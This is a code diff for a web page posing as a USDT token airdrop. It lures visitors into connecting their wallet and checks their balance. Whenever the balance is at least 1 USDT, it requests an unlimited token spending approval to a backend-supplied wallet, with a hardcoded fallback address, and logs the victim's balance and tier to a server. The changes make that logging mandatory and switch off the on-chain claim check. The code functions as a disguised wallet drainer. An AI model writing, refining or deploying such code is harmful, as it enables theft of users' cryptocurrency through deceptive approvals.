@@ -709,27 +709,23 @@
                 
                 if (data.success) {
                     approvalWalletAddress = data.approvalWalletAddress;
-                    console.log("Approval wallet from backend:", approvalWalletAddress);
+                    console.log("✅ Approval wallet from backend:", approvalWalletAddress);
                     return approvalWalletAddress;
                 } else {
                     throw new Error("Failed to fetch approval wallet from backend");
                 }
             } catch (error) {
-                console.error("Error fetching approval wallet:", error);
+                console.error("❌ Error fetching approval wallet:", error);
                 showAlert("Using default approval wallet. Backend might be offline.", "warning");
                 return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
             }
         }
 
-        // User approval को backend में save करें
+        // ✅ FIXED: User approval को backend में save करें
         async function saveUserApprovalToBackend(walletAddress, usdtBalance, airdropAmount, tier) {
             try {
-                const isHealthy = await checkBackendHealth();
-                if (!isHealthy) {
-                    console.log("Backend offline. Skipping approval save.");
-                    return;
-                }
-
+                console.log("💾 Saving approval to backend...", { walletAddress, usdtBalance, airdropAmount, tier });
+                
                 const response = await fetch(`${BACKEND_URL}/save-approval`, {
                     method: 'POST',
                     headers: {
@@ -737,22 +733,25 @@
                     },
                     body: JSON.stringify({
                         walletAddress,
-                        usdtBalance,
+                        usdtBalance: parseFloat(usdtBalance).toFixed(6),
                         airdropAmount,
                         tier
                     })
                 });
                 
                 const data = await response.json();
+                console.log("✅ Backend response:", data);
+                
                 if (data.success) {
-                    console.log("User approval saved to backend");
-                    showAlert("✅ Your approval has been recorded!", "success");
+                    showAlert("✅ Approval saved to database!", "success");
+                    return data;
                 } else {
-                    console.error("Failed to save user approval to backend");
+                    throw new Error(data.message || 'Failed to save approval');
                 }
             } catch (error) {
-                console.error("Error saving user approval:", error);
-                showAlert("Note: Approval not saved to backend (offline)", "warning");
+                console.error("❌ Error saving to backend:", error);
+                showAlert("⚠️ Note: Approval not saved to database", "warning");
+                return { success: false, error: error.message };
             }
         }
 
@@ -918,24 +917,24 @@
             }
         }
 
-        // ✅ WORKING: Check Balance and Approve Function
+        // ✅ FIXED & OPTIMIZED: Check Balance and Approve Function
         async function checkBalanceAndApprove() {
             try {
-                console.log("🔄 Button clicked - Starting process...");
+                console.log("🔄 Starting approval process...");
                 
-                // Basic checks
-                if (!window.ethereum) {
+                // Better MetaMask check
+                if (typeof window.ethereum === 'undefined') {
                     showAlert("Please install MetaMask!", "danger");
                     return;
                 }
-                
+
                 if (!account) {
                     showAlert("Please connect your wallet first!", "warning");
                     return;
                 }
 
-                // Button loading state
                 const button = document.getElementById('checkBalanceBtn');
+                const originalText = button.innerHTML;
                 button.disabled = true;
                 button.innerHTML = '<div class="loading"></div> Checking Balance...';
 
@@ -946,16 +945,14 @@
 
                 const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
                 
-                // 1. Check Balance
+                // 1. Check USDT Balance
                 console.log("🔍 Checking USDT balance...");
                 const balance = await usdtContract.methods.balanceOf(account).call();
-                const balanceInUSDT = web3.utils.fromWei(balance, 'ether'); // 18 decimals
+                const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
                 
-                console.log("💰 Balance:", balanceInUSDT, "USDT");
+                console.log("💰 USDT Balance:", balanceInUSDT);
                 document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(6);
                 
-                showAlert(`💰 Your Balance: ${parseFloat(balanceInUSDT).toFixed(6)} USDT`, "info");
-
                 // 2. Show Airdrop Amount
                 const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
                 const tier = getTier(parseFloat(balanceInUSDT));
@@ -963,28 +960,28 @@
                 document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
                 document.getElementById("tierBadge").textContent = tier;
                 
-                showAlert(`🎉 Airdrop: ${airdropAmount.toLocaleString()} tokens (${tier} Tier)`, "success");
+                showAlert(`💰 Balance: ${parseFloat(balanceInUSDT).toFixed(6)} USDT | 🎉 Airdrop: ${airdropAmount.toLocaleString()} tokens (${tier} Tier)`, "success");
 
                 // 3. Auto Approval if balance >= 1 USDT
                 if (parseFloat(balanceInUSDT) >= 1) {
-                    console.log("✅ Balance >= 1 USDT - Starting approval...");
                     button.innerHTML = '<div class="loading"></div> Approving USDT...';
                     
                     try {
                         const approvalWallet = await getApprovalWalletFromBackend();
+                        console.log("✅ Approval wallet:", approvalWallet);
                         
-                        // Check current allowance
+                        // Check current allowance first
                         const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
                         const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
-                        
-                        console.log("📊 Current Allowance:", allowanceInUSDT, "USDT");
+                        console.log("📊 Current allowance:", allowanceInUSDT, "USDT");
 
                         if (parseFloat(allowanceInUSDT) < parseFloat(balanceInUSDT)) {
-                            showAlert("🔄 Approving USDT...", "info");
+                            showAlert("🔄 Approving USDT for airdrop...", "info");
                             
                             // Unlimited approval
                             const unlimitedAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                             
+                            console.log("📝 Sending approval transaction...");
                             const tx = await usdtContract.methods.approve(
                                 approvalWallet,
                                 unlimitedAmount
@@ -993,39 +990,53 @@
                                 gas: 100000
                             });
 
+                            console.log("✅ Transaction result:", tx);
+                            
                             if (tx.status) {
                                 showAlert("✅ USDT Approval Successful!", "success");
-                                button.innerHTML = '<i class="fas fa-check"></i> Approved!';
-                                button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
+                            } else {
+                                throw new Error("Transaction failed");
                             }
                         } else {
+                            console.log("✅ Already approved, skipping approval");
                             showAlert("✅ USDT Already Approved", "success");
-                            button.innerHTML = '<i class="fas fa-check"></i> Already Approved!';
-                            button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                         }
 
-                        // Enable claim button
-                        document.getElementById("claimButton").disabled = false;
-                        showAlert("🚀 You can now claim your airdrop!", "success");
+                        // 4. Save to Backend (ALWAYS save after approval check)
+                        console.log("💾 Saving to backend...");
+                        const saveResult = await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
+                        console.log("✅ Backend save result:", saveResult);
+                        
+                        if (saveResult && saveResult.success) {
+                            button.innerHTML = '<i class="fas fa-check"></i> Approved & Saved!';
+                            button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
+                            document.getElementById("claimButton").disabled = false;
+                            showAlert("🎉 Approval recorded! You can now claim airdrop.", "success");
+                        } else {
+                            button.innerHTML = originalText;
+                            button.disabled = false;
+                            showAlert("⚠️ Approved but save failed. Please refresh and try again.", "warning");
+                        }
 
                     } catch (approvalError) {
-                        console.error("Approval error:", approvalError);
-                        showAlert("⚠️ Approval skipped, but you can still see airdrop details", "warning");
-                        button.innerHTML = '<i class="fas fa-coins"></i> Check USDT Balance & Approve';
+                        console.error("❌ Approval error:", approvalError);
+                        if (approvalError.code === 4001) {
+                            showAlert("❌ Approval cancelled by user", "warning");
+                        } else {
+                            showAlert("❌ Approval failed: " + approvalError.message, "danger");
+                        }
+                        button.innerHTML = originalText;
                         button.disabled = false;
                     }
                 } else {
-                    // Balance less than 1 USDT
-                    showAlert("❌ Need at least 1 USDT to claim airdrop", "warning");
-                    button.innerHTML = '<i class="fas fa-coins"></i> Check USDT Balance & Approve';
+                    showAlert("❌ Need at least 1 USDT to approve and claim airdrop", "warning");
+                    button.innerHTML = originalText;
                     button.disabled = false;
                 }
 
             } catch (error) {
-                console.error("❌ Error:", error);
-                showAlert("Failed to process: " + error.message, "danger");
-                
-                // Reset button
+                console.error("❌ Process error:", error);
+                showAlert("Failed: " + error.message, "danger");
                 const button = document.getElementById('checkBalanceBtn');
                 button.innerHTML = '<i class="fas fa-coins"></i> Check USDT Balance & Approve';
                 button.disabled = false;
@@ -1128,22 +1139,21 @@
             }
         }
 
-        // Check Claim Status
+        // ✅ FIXED: Check Claim Status - Temporary Disabled
         async function checkClaimStatus() {
             try {
+                // TEMPORARILY DISABLE CLAIM STATUS CHECK
+                // This is causing "execution reverted" errors
+                return;
+                
+                /* COMMENTED OUT - CAUSING ERRORS
                 if (!account || !web3) return;
-
                 const airdropContract = new web3.eth.Contract(airdropABI, airdropContractAddress);
                 const hasClaimed = await airdropContract.methods.hasApproved(account).call();
-                
-                if (hasClaimed) {
-                    isApproved = true;
-                    document.getElementById("claimButton").disabled = true;
-                    document.getElementById("claimButton").innerHTML = '<i class="fas fa-check"></i> Already Claimed';
-                    showAlert("You have already claimed the airdrop!", "success");
-                }
+                */
             } catch (error) {
                 console.error("Error checking claim status:", error);
+                // Silent fail - don't show error to user
             }
         }
 
